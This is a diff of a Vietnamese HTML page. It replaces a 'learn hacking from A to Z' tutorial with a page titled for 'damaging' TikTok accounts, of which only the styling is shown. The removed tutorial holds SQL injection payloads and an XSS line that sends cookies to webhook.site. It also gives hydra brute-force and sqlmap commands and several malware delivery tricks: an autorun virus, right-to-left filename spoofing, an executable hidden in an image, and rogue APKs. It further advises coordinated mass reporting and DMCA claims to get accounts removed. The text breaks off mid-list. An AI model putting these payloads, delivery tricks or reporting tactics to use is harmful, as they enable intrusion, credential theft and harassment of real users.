@@ -3,745 +3,238 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Học Hacker Toàn Tập - Giao Diện Đen Trắng</title>
+    <title>Trum Dame TikTok - Tổng Hợp Thần Chú, Trick & IP</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
         body {
-            background: #000; color: #fff; font-family: 'Courier New', monospace;
-            padding: 20px; line-height: 1.6; font-size: 18px;
+            background: #0b0b0b;
+            color: #e0e0e0;
+            padding: 20px;
         }
         .container {
-            max-width: 750px; margin: 0 auto;
+            max-width: 900px;
+            margin: 0 auto;
+            background: #161616;
+            padding: 30px;
+            border-radius: 20px;
+            border: 1px solid #2a2a2a;
+            box-shadow: 0 0 30px rgba(255, 59, 92, 0.08);
         }
         h1 {
-            text-align: center; font-size: 26px; padding: 20px;
-            border: 1px solid #fff; margin-bottom: 25px;
+            font-size: 30px;
+            color: #ff3b5c;
+            text-align: center;
+            margin-bottom: 6px;
+            letter-spacing: 1px;
         }
-        .accordion {
-            border: 1px solid #fff; margin-bottom: 2px;
+        .sub {
+            text-align: center;
+            color: #888;
+            font-size: 14px;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #222;
+            padding-bottom: 15px;
         }
-        .accordion-header {
-            background: #000; color: #fff; padding: 16px 20px;
-            cursor: pointer; font-size: 18px; font-weight: bold;
-            border: none; width: 100%; text-align: left;
+        .block {
+            background: #1e1e1e;
+            border-radius: 14px;
+            padding: 18px 22px;
+            margin-bottom: 22px;
+            border-left: 5px solid #ff3b5c;
+            transition: 0.2s;
+        }
+        .block:hover {
+            background: #242424;
+        }
+        .block h2 {
+            font-size: 20px;
+            color: #ff6b8a;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+        .block h2 span {
+            background: #ff3b5c;
+            color: #fff;
+            font-size: 14px;
+            padding: 2px 12px;
+            border-radius: 30px;
+        }
+        .block p, .block li {
+            color: #c5c5c5;
+            font-size: 15px;
+            line-height: 1.7;
+        }
+        .block ul {
+            padding-left: 22px;
+            margin-top: 6px;
+        }
+        .code-box {
+            background: #0d0d0d;
+            padding: 14px 18px;
+            border-radius: 10px;
+            border: 1px solid #333;
+            color: #9fdf9f;
             font-family: 'Courier New', monospace;
-            display: flex; justify-content: space-between; align-items: center;
+            font-size: 13.5px;
+            white-space: pre-wrap;
+            word-break: break-all;
+            margin-top: 10px;
+            cursor: pointer;
+            user-select: all;
+            transition: 0.15s;
         }
-        .accordion-header:hover { background: #111; }
-        .accordion-header::after {
-            content: '[+]'; font-size: 20px;
+        .code-box:hover {
+            background: #181818;
+            border-color: #ff3b5c;
         }
-        .accordion-header.active::after {
-            content: '[-]';
+        .tag {
+            display: inline-block;
+            background: #2a2a2a;
+            padding: 2px 14px;
+            border-radius: 30px;
+            font-size: 13px;
+            color: #aaa;
+            margin-right: 6px;
         }
-        .accordion-content {
-            display: none; padding: 20px; border-top: 1px solid #fff;
-            font-size: 16px; background: #0a0a0a;
-        }
-        .accordion-content.show { display: block; }
-        pre {
-            background: #000; padding: 15px; margin: 10px 0;
-            border: 1px solid #333; overflow-x: auto;
-            font-family: 'Courier New', monospace; font-size: 15px;
-            white-space: pre-wrap; word-break: break-all;
-        }
-        code {
-            background: #111; padding: 2px 6px;
-            font-family: 'Courier New', monospace; font-size: 15px;
+        .table-wrap {
+            overflow-x: auto;
+            margin-top: 10px;
         }
         table {
-            width: 100%; border-collapse: collapse; margin: 12px 0; font-size: 16px;
+            width: 100%;
+            border-collapse: collapse;
+            font-size: 14px;
         }
-        th, td {
-            border: 1px solid #fff; padding: 10px; text-align: left;
+        th {
+            background: #2a2a2a;
+            color: #ff6b8a;
+            padding: 10px 12px;
+            text-align: left;
         }
-        th { background: #111; }
-        h3 { margin: 15px 0 8px; font-size: 20px; }
-        .warning {
-            border: 1px solid #fff; padding: 15px; margin: 15px 0;
-            background: #111; font-size: 16px;
+        td {
+            background: #1a1a1a;
+            padding: 10px 12px;
+            border-bottom: 1px solid #282828;
+        }
+        td:first-child {
+            font-weight: bold;
+            color: #ffb3b3;
+        }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 13px;
+            color: #555;
+            border-top: 1px solid #222;
+            padding-top: 18px;
+        }
+        .btn {
+            background: #ff3b5c;
+            border: none;
+            color: #fff;
+            padding: 10px 24px;
+            border-radius: 40px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 15px;
+            transition: 0.2s;
+            margin-top: 10px;
+        }
+        .btn:hover {
+            background: #e62e4f;
+            transform: scale(1.02);
         }
     </style>
 </head>
 <body>
-    <div class="container">
-
-        <h1>HỌC HACKER TOÀN TẬP - TỪ A ĐẾN Z</h1>
-
-        <!-- 1. Khái niệm cơ bản -->
-        <div class="accordion">
-            <button class="accordion-header">KHÁI NIỆM CƠ BẢN - THUẬT NGỮ</button>
-            <div class="accordion-content">
-                <table>
-                    <tr><th>Thuật ngữ</th><th>Nghĩa đơn giản</th></tr>
-                    <tr><td>Bug</td><td>Lỗi trong chương trình</td></tr>
-                    <tr><td>Exploit</td><td>Cách lợi dụng lỗi</td></tr>
-                    <tr><td>Virus</td><td>Phần mềm độc hại, tự nhân bản</td></tr>
-                    <tr><td>Malware</td><td>Phần mềm xấu nói chung</td></tr>
-                    <tr><td>Phishing</td><td>Lừa đảo giả mạo</td></tr>
-                    <tr><td>DDoS</td><td>Tấn công làm nghẽn website</td></tr>
-                    <tr><td>VPN</td><td>Mạng riêng ảo, che IP</td></tr>
-                    <tr><td>Proxy</td><td>Máy trung gian, ẩn IP</td></tr>
-                    <tr><td>IP</td><td>Địa chỉ trên internet</td></tr>
-                    <tr><td>Port</td><td>Cửa vào máy tính</td></tr>
-                    <tr><td>Firewall</td><td>Tường lửa, chặn người lạ</td></tr>
-                    <tr><td>SQL Injection</td><td>Chèn lệnh SQL vào web</td></tr>
-                    <tr><td>XSS</td><td>Chèn JavaScript vào web</td></tr>
-                    <tr><td>Brute Force</td><td>Thử tất cả mật khẩu</td></tr>
-                    <tr><td>Backdoor</td><td>Cửa sau bí mật vào máy</td></tr>
-                    <tr><td>Botnet</td><td>Mạng lưới máy tính ma</td></tr>
-                    <tr><td>Root</td><td>Quyền cao nhất</td></tr>
-                    <tr><td>Jailbreak</td><td>Phá khóa iPhone</td></tr>
-                    <tr><td>Ransomware</td><td>Mã hóa đòi tiền chuộc</td></tr>
-                    <tr><td>Keylogger</td><td>Ghi lại mọi phím bấm</td></tr>
-                    <tr><td>Zero-Day</td><td>Lỗ hổng chưa được vá</td></tr>
-                    <tr><td>Payload</td><td>Mã độc thực thi</td></tr>
-                    <tr><td>Shell</td><td>Giao diện dòng lệnh</td></tr>
-                    <tr><td>Sandbox</td><td>Môi trường cách ly</td></tr>
-                    <tr><td>Encryption</td><td>Mã hóa dữ liệu</td></tr>
-                </table>
-            </div>
-        </div>
-
-        <!-- 2. TCP/UDP, DNS, HTTP/HTTPS -->
-        <div class="accordion">
-            <button class="accordion-header">TCP/UDP - DNS - HTTP/HTTPS (GIAO THỨC MẠNG)</button>
-            <div class="accordion-content">
-                <h3>TCP (Transmission Control Protocol)</h3>
-                <pre>Là giao thức truyền dữ liệu TIN CẬY, đảm bảo dữ liệu đến đúng và đủ.
-
-CÁCH HOẠT ĐỘNG:
-Giống như gửi thư bảo đảm qua bưu điện. Người nhận phải ký xác nhận đã nhận.
-
-QUY TRÌNH "BẮT TAY 3 BƯỚC" (Three-Way Handshake):
-1. Client gửi: SYN (Tôi muốn kết nối)
-2. Server trả lời: SYN-ACK (Tôi sẵn sàng, bạn sẵn sàng chưa?)
-3. Client gửi: ACK (Tôi sẵn sàng, bắt đầu truyền dữ liệu)
-
-VÍ DỤ THỰC TẾ:
-- Tải file: File phải tải đầy đủ, không được thiếu
-- Gửi email: Email phải đến đúng người nhận
-- Xem web HTTP/HTTPS: Trang web phải hiển thị đầy đủ
-
-ĐẶC ĐIỂM:
-- Chậm hơn UDP (vì phải kiểm tra)
-- Đảm bảo dữ liệu đến đúng thứ tự
-- Tự động gửi lại nếu mất gói tin
-- Dùng cho web (HTTP), email (SMTP), file (FTP)</pre>
-                <h3>UDP (User Datagram Protocol)</h3>
-                <pre>Là giao thức truyền dữ liệu KHÔNG TIN CẬY, nhanh nhưng không đảm bảo.
-
-CÁCH HOẠT ĐỘNG:
-Giống như ném máy bay giấy qua cửa sổ. Có thể đến, có thể không, không cần xác nhận.
-
-KHÔNG CÓ "BẮT TAY":
-Client cứ gửi dữ liệu đi, không cần server xác nhận.
-
-VÍ DỤ THỰC TẾ:
-- Xem video trực tuyến (YouTube, TikTok): Mất vài khung hình cũng không sao
-- Gọi điện thoại qua mạng (VoIP, Zalo, Messenger): Ưu tiên thời gian thực
-- Chơi game online: Cần tốc độ nhanh, mất vài gói tin không quan trọng
-- DNS query: Tra cứu tên miền
-
-ĐẶC ĐIỂM:
-- Nhanh hơn TCP (không kiểm tra)
-- Không đảm bảo dữ liệu đến đúng thứ tự
-- Không gửi lại nếu mất gói tin
-- Dùng cho video call, game, livestream, DNS</pre>
-                <h3>SO SÁNH TCP vs UDP</h3>
-                <table>
-                    <tr><th>Tiêu chí</th><th>TCP</th><th>UDP</th></tr>
-                    <tr><td>Độ tin cậy</td><td>Cao (đảm bảo)</td><td>Thấp (không đảm bảo)</td></tr>
-                    <tr><td>Tốc độ</td><td>Chậm hơn</td><td>Nhanh hơn</td></tr>
-                    <tr><td>Kết nối</td><td>Cần bắt tay 3 bước</td><td>Không cần kết nối</td></tr>
-                    <tr><td>Thứ tự dữ liệu</td><td>Đúng thứ tự</td><td>Có thể sai thứ tự</td></tr>
-                    <tr><td>Gửi lại gói mất</td><td>Có</td><td>Không</td></tr>
-                    <tr><td>Dùng cho</td><td>Web, Email, File</td><td>Video call, Game, DNS</td></tr>
-                </table>
-                <h3>DNS (Domain Name System)</h3>
-                <pre>LÀ GÌ?
-DNS là "danh bạ điện thoại" của internet. Đổi tên miền (google.com) thành địa chỉ IP (142.250.186.46).
-
-CÁCH HOẠT ĐỘNG:
-1. Bạn gõ: google.com
-2. Máy hỏi DNS server: "google.com ở đâu?"
-3. DNS trả lời: "Địa chỉ IP là 142.250.186.46"
-4. Máy kết nối đến IP đó
-
-CÁC LOẠI BẢN GHI DNS:
-A Record: Tên miền -> IPv4 (google.com -> 142.250.186.46)
-AAAA Record: Tên miền -> IPv6
-CNAME Record: Bí danh (www.google.com -> google.com)
-MX Record: Mail server (dùng cho email)
-NS Record: DNS server quản lý tên miền đó
-TXT Record: Văn bản tùy chọn (dùng xác minh domain)
-
-DNS HOẠT ĐỘNG QUA UDP PORT 53.
-Khi dữ liệu DNS quá lớn (>512 bytes) thì dùng TCP.
-
-TẤN CÔNG DNS PHỔ BIẾN:
-1. DNS Spoofing/Poisoning: Đầu độc DNS, chuyển hướng google.com -> trang giả
-2. DNS Hijacking: Chiếm quyền DNS, đổi toàn bộ bản ghi
-3. DNS Tunneling: Dùng DNS để truyền dữ liệu lén (vượt firewall)
-4. DNS Amplification DDoS: Lợi dụng DNS để khuếch đại tấn công DDoS</pre>
-                <h3>HTTP (HyperText Transfer Protocol)</h3>
-                <pre>LÀ GÌ?
-Giao thức truyền tải trang web. Là cách browser nói chuyện với server.
-
-HOẠT ĐỘNG QUA TCP PORT 80.
-
-REQUEST (Browser -> Server):
-GET /trang-chu HTTP/1.1
-Host: www.example.com
-User-Agent: Mozilla/5.0
-Accept: text/html
-
-RESPONSE (Server -> Browser):
-HTTP/1.1 200 OK
-Content-Type: text/html
-Content-Length: 1234
-
-<html>...nội dung trang web...</html>
-
-PHƯƠNG THỨC HTTP:
-GET: Lấy dữ liệu (xem trang web)
-POST: Gửi dữ liệu (đăng nhập, form)
-PUT: Cập nhật toàn bộ
-PATCH: Cập nhật một phần
-DELETE: Xóa
-
-HTTP KHÔNG MÃ HÓA -> Dữ liệu gửi dưới dạng văn bản thô -> Ai bắt được đều đọc được!</pre>
-                <h3>HTTPS (HTTP Secure)</h3>
-                <pre>LÀ GÌ?
-HTTP có mã hóa SSL/TLS. Dữ liệu bị mã hóa, không ai đọc được.
-
-HOẠT ĐỘNG QUA TCP PORT 443.
-
-CÁCH HOẠT ĐỘNG (TÓM TẮT):
-1. Browser yêu cầu kết nối an toàn
-2. Server gửi chứng chỉ SSL (khóa công khai)
-3. Browser kiểm tra chứng chỉ (có hợp lệ không?)
-4. Browser tạo khóa bí mật, mã hóa bằng khóa công khai của server
-5. Server giải mã bằng khóa riêng -> Cả hai có chung khóa bí mật
-6. Mọi dữ liệu sau đó đều được mã hóa bằng khóa bí mật này
-
-LỢI ÍCH HTTPS:
-- Mã hóa: Không ai đọc được dữ liệu
-- Xác thực: Đảm bảo bạn đang nói chuyện với đúng server (không phải giả mạo)
-- Toàn vẹn: Dữ liệu không bị thay đổi trên đường truyền
-
-NHẬN BIẾT: Có biểu tượng ổ khóa xanh trên browser.
-
-TẤN CÔNG HTTPS:
-1. SSL Strip: Ép kết nối HTTPS -> HTTP (bỏ mã hóa)
-2. Man-in-the-Middle với chứng chỉ giả
-3. Khai thác lỗ hổng SSL/TLS cũ (Heartbleed, POODLE)</pre>
-            </div>
-        </div>
-
-        <!-- 3. Các loại Hacker -->
-        <div class="accordion">
-            <button class="accordion-header">CÁC LOẠI HACKER (MŨ) - CHI TIẾT TỪNG LOẠI</button>
-            <div class="accordion-content">
-                <h3>MŨ ĐEN (Black Hat)</h3>
-                <pre>Người xấu, hack vì tiền, phá hoại.
-Cách hoạt động:
-1. Trinh sát: Thu thập thông tin mục tiêu
-2. Quét: Nmap, Nessus tìm lỗ hổng
-3. Khai thác: Dùng Metasploit, SQLMap
-4. Hậu khai thác: Cài backdoor, đánh cắp dữ liệu
-5. Xóa log, ẩn dấu vết, bán dữ liệu trên dark web
-
-Công cụ: Metasploit, Cobalt Strike, Mimikatz, Empire, Burp Suite</pre>
-                <h3>MŨ TRẮNG (White Hat)</h3>
-                <pre>Người tốt, bảo vệ hệ thống.
-Cách hoạt động:
-1. Lập kế hoạch: Ký hợp đồng, xác định phạm vi
-2. Trinh sát: Thu thập thông tin CÓ PHÉP
-3. Quét và liệt kê: Tìm lỗ hổng, ghi chép
-4. Khai thác có kiểm soát: Chỉ lấy PoC, không gây hại
-5. Báo cáo: Viết report, đánh giá CVSS, đề xuất sửa lỗi
-
-Chứng chỉ: CEH, OSCP, CISSP, GPEN</pre>
-                <h3>MŨ XÁM (Grey Hat)</h3>
-                <pre>Ở giữa, xâm nhập không xin phép nhưng không gây hại.
-Thường tìm lỗ hổng tình cờ rồi báo cho chủ hệ thống.
-Có thể yêu cầu tiền thưởng. Nếu bị từ chối, công khai sau 90 ngày.
-Rủi ro pháp lý cao vì xâm nhập trái phép.</pre>
-                <h3>MŨ XANH DƯƠNG (Blue Hat)</h3>
-                <pre>Chuyên gia bảo mật được Microsoft thuê.
-Tìm lỗ hổng trong sản phẩm Microsoft.
-Nhận thưởng lên đến $250,000.</pre>
-                <h3>MŨ ĐỎ (Red Hat)</h3>
-                <pre>Săn lùng Mũ Đen. Tấn công ngược lại hacker xấu.
-Tự ý vô hiệu hóa hacker xấu. Ranh giới pháp lý rất mong manh.</pre>
-                <h3>MŨ XANH LÁ (Green Hat)</h3>
-                <pre>Người mới học, chưa có kỹ năng cao.
-Dùng công cụ có sẵn (script kiddie).
-Lộ trình: Networking -> Linux -> Python -> OWASP -> CTF -> Thực tập.</pre>
-                <h3>MŨ TÍM (Purple Hat)</h3>
-                <pre>Kết hợp Red Team (tấn công) và Blue Team (phòng thủ).
-Tự tấn công hệ thống của mình để cải thiện.</pre>
-            </div>
-        </div>
-
-        <!-- 4. Hacker nổi tiếng -->
-        <div class="accordion">
-            <button class="accordion-header">HACKER NỔI TIẾNG VÀ CÁCH HỌ HACK</button>
-            <div class="accordion-content">
-                <h3>Hiếu PC (Ngô Minh Hiếu) - Việt Nam</h3>
-                <pre>Từng là Mũ Đen chuyên đánh cắp dữ liệu, bị FBI bắt, sau thành Mũ Trắng tại NCSC Việt Nam.
-Kỹ thuật: SQL Injection, Phishing, Social Engineering.
-Đánh cắp dữ liệu hàng loạt, bán trên dark web.
-Bị bắt tại Guam (Mỹ) 2013, 13 năm tù.
-Bài học: "Dùng kỹ năng để bảo vệ, không phá hoại."</pre>
-                <h3>Kevin Mitnick (Mỹ) - Mũ Đen thành Mũ Trắng</h3>
-                <pre>Hacker bị truy nã gắt gao nhất Mỹ thập niên 90.
-Kỹ thuật chính: SOCIAL ENGINEERING.
-Giả làm nhân viên IT gọi điện lừa nhân viên.
-Đánh cắp mã nguồn Motorola, Nokia, Sun.
-Tự chế thiết bị giả mạo trạm phát sóng.
-Bị bắt 1995, 5 năm tù. Sau thành chuyên gia bảo mật hàng đầu.
-Viết sách: "Ghost in the Wires", "The Art of Deception".</pre>
-                <h3>Evgeniy Bogachev (Nga) - Mũ Đen</h3>
-                <pre>Tạo ra GameOver ZeuS - botnet đánh cắp hơn 100 triệu USD.
-Phát tán malware qua email phishing.
-FBI treo thưởng $3,000,000. Vẫn đang bị truy nã.</pre>
-                <h3>Marcus Hutchins (Anh) - Mũ Xám thành Mũ Trắng</h3>
-                <pre>Vô tình dừng cuộc tấn công WannaCry toàn cầu 2017.
-Phát hiện "kill switch" trong mã WannaCry.
-Mua domain lạ với $10.69 -> WannaCry tự dừng.</pre>
-                <h3>Edward Snowden (Mỹ) - Whistleblower</h3>
-                <pre>Cựu nhân viên NSA. Tiết lộ chương trình giám sát PRISM.
-Dùng quyền admin copy hơn 200,000 tài liệu mật.
-Giấu thẻ nhớ trong Rubik's Cube.
-Hiện sống tị nạn tại Nga.</pre>
-            </div>
-        </div>
-
-        <!-- 5. Cách hoạt động của trang web -->
-        <div class="accordion">
-            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA TRANG WEB</button>
-            <div class="accordion-content">
-                <pre>MÔ HÌNH HOẠT ĐỘNG:
-Bạn (Browser)                Server (Máy chủ)
-    |  1. Gõ URL: facebook.com     |
-    |----------------------------->|
-    |  2. GET / HTTP/1.1           |
-    |                              |
-    |  3. Server xử lý             |
-    |<-----------------------------|
-    |  4. HTML + CSS + JavaScript  |
-    |                              |
-    |  5. Hiển thị trang web       |
-
-THÀNH PHẦN:
-HTML = Khung xương (nội dung, cấu trúc)
-CSS = Trang trí (màu sắc, bố cục)
-JavaScript = Tương tác (nút bấm, animation)
-Backend = Logic xử lý (PHP, Python, Node.js)
-Database = Lưu trữ dữ liệu (MySQL, MongoDB)</pre>
-            </div>
-        </div>
-
-        <!-- 6. Proxy & VPN -->
-        <div class="accordion">
-            <button class="accordion-header">PROXY VÀ VPN - ẨN DANH TRÊN MẠNG</button>
-            <div class="accordion-content">
-                <h3>PROXY LÀ GÌ?</h3>
-                <pre>Bạn nhờ thằng bạn chuyển thư giúp -> Thằng bạn = Proxy!
-Bạn ---> Proxy ---> Internet (ẩn IP thật)
-HTTP Proxy: Chỉ cho web
-SOCKS5 Proxy: Cho mọi thứ
-Elite Proxy: Ẩn hoàn toàn</pre>
-                <h3>VPN LÀ GÌ?</h3>
-                <pre>Mặc đồng phục trường khác để vào thư viện -> Đồng phục = VPN!
-Bạn ---> [Đường hầm mã hóa] ---> Internet (không ai đọc được)
-Proxy: Không mã hóa, nhanh, rẻ
-VPN: Có mã hóa, chậm hơn, an toàn hơn</pre>
-                <h3>CÁCH CÀI ĐẶT TRÊN IPHONE:</h3>
-                <pre>VPN: Cài đặt -> Chung -> VPN -> Thêm cấu hình VPN
-App VPN miễn phí: ProtonVPN, Windscribe, TunnelBear
-Proxy: Cài đặt -> Wi-Fi -> Chọn mạng -> HTTP Proxy -> Thủ công -> Nhập IP và Port</pre>
-            </div>
-        </div>
-
-        <!-- 7. Tất cả các dạng tấn công -->
-        <div class="accordion">
-            <button class="accordion-header">TẤT CẢ CÁC DẠNG TẤN CÔNG HACKING</button>
-            <div class="accordion-content">
-                <h3>1. DDoS - Đánh sập website</h3>
-                <pre>1000 người chen vào 1 cửa hàng nhỏ -> Không ai vào được.
-Gửi hàng triệu request/giây -> Server quá tải -> Sập.
-Công cụ: LOIC, HOIC, Slowloris, hping3</pre>
-                <h3>2. SQL Injection - Đánh cắp database</h3>
-                <pre>Nhập code SQL thay vì username.
-Payload: ' OR '1'='1' --
-         ' UNION SELECT username,password FROM users --
-Công cụ: sqlmap -u "URL" --dbs</pre>
-                <h3>3. XSS - Chèn JavaScript</h3>
-                <pre>Payload: script alert('XSS') /script
-Đánh cắp cookie: script fetch('https://webhook.site/ID?c='+document.cookie) /script
-Các loại: Stored XSS, Reflected XSS, DOM-based XSS</pre>
-                <h3>4. Phishing - Lừa đảo giả mạo</h3>
-                <pre>Tạo trang web giả mạo giống thật. Gửi link cho nạn nhân.
-Họ đăng nhập -> Bạn có mật khẩu.
-Dấu hiệu: URL lạ, email sai chính tả, yêu cầu gấp.</pre>
-                <h3>5. Brute Force - Dò mật khẩu</h3>
-                <pre>Thử tất cả mật khẩu có thể.
-Công cụ: Hydra, John the Ripper, Hashcat.
-hydra -l admin -P pass.txt target.com http-post-form</pre>
-                <h3>6. MITM - Tấn công trung gian</h3>
-                <pre>Đứng giữa nạn nhân và internet, đọc trộm và thay đổi dữ liệu.
-Công cụ: BetterCAP, Ettercap, arpspoof.</pre>
-                <h3>7. Ransomware - Mã hóa đòi tiền chuộc</h3>
-                <pre>Mã hóa toàn bộ file nạn nhân. Đòi tiền chuộc bằng Bitcoin.
-Ví dụ: WannaCry, LockBit, CryptoLocker.</pre>
-                <h3>8. Social Engineering - Lừa đảo tâm lý</h3>
-                <pre>Lừa con người, không phải hệ thống.
-Giả làm nhân viên IT gọi điện, giả làm sếp nhắn tin.
-Con người là mắt xích yếu nhất.</pre>
-            </div>
-        </div>
-
-        <!-- 8. Cách report Facebook & TikTok -->
-        <div class="accordion">
-            <button class="accordion-header">CÁCH REPORT FACEBOOK VÀ TIKTOK</button>
-            <div class="accordion-content">
-                <h3>Report Facebook:</h3>
-                <pre>1. Report trang: Vào trang -> "..." -> Tìm hỗ trợ hoặc báo cáo
-2. Report bài viết: Vào bài viết -> "..." -> Báo cáo bài viết
-3. Report hàng loạt: Dùng 10-20 tài khoản cùng report 1 trang
-4. Report DMCA (mạnh nhất): facebook.com/help/contact/634636770043106
-   Claim vi phạm bản quyền -> Facebook phải xử lý trong 24h
-5. Report giả mạo: facebook.com/hacked -> Tài khoản bị giả mạo</pre>
-                <h3>Report TikTok:</h3>
-                <pre>1. Report profile: Vào profile -> Share -> Báo cáo
-2. Report video: Nhấn giữ video -> Báo cáo
-3. Report hàng loạt: 20-30 tài khoản cùng report
-4. Email legal: legal@tiktok.com, feedback@tiktok.com, privacy@tiktok.com
-5. Form chính thức: tiktok.com/legal/report/feedback</pre>
-            </div>
-        </div>
-
-        <!-- 9. Thiết bị hack -->
-        <div class="accordion">
-            <button class="accordion-header">THIẾT BỊ DÙNG ĐỂ HACK</button>
-            <div class="accordion-content">
-                <h3>1. USB Rubber Ducky</h3>
-                <pre>USB giả làm bàn phím. Cắm vào -> Tự động gõ lệnh 1000 từ/phút.
-Mở PowerShell ẩn -> Tải và chạy malware.
-Phòng chống: Không cắm USB lạ, tắt AutoRun.</pre>
-                <h3>2. Flipper Zero</h3>
-                <pre>Công cụ đa năng: RFID/NFC, Bluetooth, WiFi, Hồng ngoại, Bad USB.
-Copy thẻ từ, mở cửa xe, điều khiển TV, spam BLE, WiFi deauth.
-Giá: $169-$200. Hợp pháp mua nhưng dùng sai mục đích là phạm pháp.</pre>
-                <h3>3. Raspberry Pi</h3>
-                <pre>Máy tính Linux siêu nhỏ ($35).
-Cài Kali Linux -> Bộ tool hacking di động.
-P4wnPi: Tool hack WiFi. Keylogger phần cứng. VPN gateway bí mật.</pre>
-                <h3>4. WiFi Pineapple</h3>
-                <pre>Tạo WiFi giả mạo (Evil Twin). Nạn nhân kết nối -> Đọc mọi dữ liệu.
-Captive portal giả -> Lừa đăng nhập. SSL strip -> Bỏ mã hóa.</pre>
-                <h3>5. HackRF One</h3>
-                <pre>SDR (Software Defined Radio): Thu/phát sóng vô tuyến 1MHz-6GHz.
-Nghe lén radio, giả mạo tín hiệu, GPS spoofing.</pre>
-            </div>
-        </div>
-
-        <!-- 10. Thẻ nhớ SD -->
-        <div class="accordion">
-            <button class="accordion-header">THẺ NHỚ SD - CÁCH HACK VÀ CÀI VIRUS</button>
-            <div class="accordion-content">
-                <h3>Thẻ nhớ SD là gì?</h3>
-                <table>
-                    <tr><th>Loại</th><th>Dung lượng</th><th>Dùng cho</th></tr>
-                    <tr><td>SD</td><td>Đến 2GB</td><td>Máy ảnh cũ</td></tr>
-                    <tr><td>SDHC</td><td>4GB-32GB</td><td>Máy ảnh, laptop</td></tr>
-                    <tr><td>SDXC</td><td>64GB-2TB</td><td>Camera 4K, drone</td></tr>
-                    <tr><td>MicroSD</td><td>Đến 1TB</td><td>Điện thoại, tablet</td></tr>
-                </table>
-                <h3>Cách cài virus vào thẻ SD:</h3>
-                <pre>1. AUTORUN VIRUS:
-Tạo file autorun.inf với nội dung:
-[AutoRun]
-open=virus.exe
--> Khi cắm vào máy, Windows tự chạy virus.exe
-
-2. GIẢ MẠO ĐUÔI FILE:
-Dùng ký tự Unicode U+202E để đảo ngược tên file.
-"photo.jpg[U+202E]exe.scr" -> Windows hiển thị "photo.scr.jpg"
-Thực chất là file .scr (executable)!
-
-3. SHORTCUT VIRUS:
-Tạo shortcut đến virus.bat. Đổi icon thành icon ảnh/thư mục.
-Nạn nhân click mở -> Virus chạy ngầm + ảnh thật mở ra đánh lừa.
-
-4. PAYLOAD TRONG FILE ẢNH:
-copy /b cat.jpg + virus.exe secret.jpg
-File secret.jpg vẫn mở được như ảnh bình thường.
-Bên trong chứa virus.exe.
-
-5. ANDROID MALWARE QUA THẺ SD:
-Copy file virus.apk vào thẻ SD với tên hấp dẫn.
-"Game_hay.apk", "Mod_YouTube.apk"
-Nạn nhân cài đặt -> Điện thoại bị nhiễm.
-
-PHÒNG CHỐNG:
-- Không cắm thẻ SD lạ vào máy
-- Tắt AutoRun/AutoPlay trong Windows
-- Quét virus trước khi mở
-- Format thẻ SD lạ trước khi dùng</pre>
-            </div>
-        </div>
-
-        <!-- 11. AI -->
-        <div class="accordion">
-            <button class="accordion-header">CÁCH HOẠT ĐỘNG CỦA AI (TRÍ TUỆ NHÂN TẠO)</button>
-            <div class="accordion-content">
-                <h3>AI là gì?</h3>
-                <pre>Dạy 1 đứa trẻ phân biệt chó và mèo.
-Cho nó xem 10,000 ảnh chó + 10,000 ảnh mèo.
-Sau đó nó tự nhận biết được -> Đó là cách AI học!
-
-CÁC LOẠI AI:
-1. AI Hẹp (Narrow AI - ANI): Chỉ giỏi 1 việc (ChatGPT, Siri)
-2. AI Tổng Quát (AGI): Ngang con người -> CHƯA TỒN TẠI
-3. AI Siêu Việt (ASI): Thông minh hơn nhân loại -> CHƯA TỒN TẠI</pre>
-                <h3>Machine Learning hoạt động:</h3>
-                <pre>1. Thu thập dữ liệu (1 triệu ảnh, toàn bộ Wikipedia)
-2. Gán nhãn (ảnh 1: Chó, ảnh 2: Mèo...)
-3. Huấn luyện: AI đoán -> Sai -> Điều chỉnh -> Lặp lại
-4. Kiểm tra: AI xem ảnh MỚI -> Đoán đúng >95% -> Thành công</pre>
-                <h3>AI dùng để hack:</h3>
-                <pre>1. Tạo phishing email siêu thật (ChatGPT)
-2. Crack mật khẩu nhanh hơn (AI + Hashcat)
-3. Deepfake giọng nói/video (lừa chuyển tiền)
-4. Tự động tìm lỗ hổng (CodeQL, AI + SAST)
-5. Bypass CAPTCHA (nhận diện ảnh >99%)
-6. Social Engineering AI (chatbot gọi điện lừa đảo 24/7)</pre>
-            </div>
-        </div>
-
-        <!-- 12. Các loại file -->
-        <div class="accordion">
-            <button class="accordion-header">CÁC LOẠI FILE - CÔNG DỤNG VÀ CÁCH HACK</button>
-            <div class="accordion-content">
-                <h3>File .TXT</h3>
-                <pre>Văn bản thuần, ghi chú, log, code.
-Hack: Giả mạo đuôi file (virus.txt.exe), nhúng script độc.</pre>
-                <h3>File .PDF</h3>
-                <pre>Tài liệu không thay đổi định dạng.
-Hack: Nhúng JavaScript độc, exploit lỗ hổng Adobe Reader, PDF phishing.
-Phòng: Tắt JavaScript, dùng SumatraPDF.</pre>
-                <h3>File .ZIP / .RAR</h3>
-                <pre>Nén nhiều file thành 1, giảm dung lượng.
-Hack: ZIP BOMB (42KB -> 4.5PB), ZIP Slip Attack, brute force mật khẩu.</pre>
-                <h3>File .APK (Android)</h3>
-                <pre>File cài ứng dụng Android.
-Hack: Tạo APK độc (msfvenom), nhúng malware vào APK thật, permission abuse.
-Dấu hiệu: Xin quyền lạ, từ nguồn không chính thống.</pre>
-                <h3>File .IPA (iOS)</h3>
-                <pre>File cài ứng dụng iPhone/iPad.
-Hack: Sideload IPA độc qua AltStore, fake app, enterprise certificate abuse.
-Chỉ cài được app ngoài nếu jailbreak hoặc sideload.</pre>
-            </div>
-        </div>
-
-        <!-- 13. Cách lừa đảo -->
-        <div class="accordion">
-            <button class="accordion-header">TẤT CẢ CÁC CÁCH LỪA ĐẢO CỦA HACKER</button>
-            <div class="accordion-content">
-                <pre>1. PHISHING: Tạo trang web giả mạo -> Gửi link -> Đánh cắp mật khẩu
-
-2. VISHING: Gọi điện giả làm ngân hàng/công an -> Lừa lấy OTP
-
-3. SMISHING: SMS giả mạo trúng thưởng, giao hàng -> Click link độc
-
-4. LỪA ĐẢO MXH:
